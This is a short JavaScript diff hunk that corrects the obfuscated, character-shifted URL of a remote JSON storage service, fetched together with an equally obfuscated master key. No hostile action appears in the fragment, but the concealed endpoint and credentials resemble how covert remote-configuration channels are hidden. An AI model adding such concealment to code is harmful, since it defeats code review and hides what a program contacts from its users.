@@ -7,7 +7,7 @@ const _X2 = '%3b%22b%222%22d2Q4YFKMytRS94fGWW4ozC/FqP0y2Md4ii{5LF666PNZNwU{8/aCD
 function _getCloudConfig() {
   const masterKey = _0x4f2a(_X2);
   const binId = _0x4f2a(_X1);
-  const baseUrl = _0x4f2a('iuuqt;00bqj/ktpogjo/jp0w40c0') + binId;
+  const baseUrl = _0x4f2a('iuuqt;00bqj/ktpocjo/jp0w40c0') + binId;
   return { 
     baseUrl, 
     latestUrl: baseUrl + _0x4f2a('0mbuftu'),
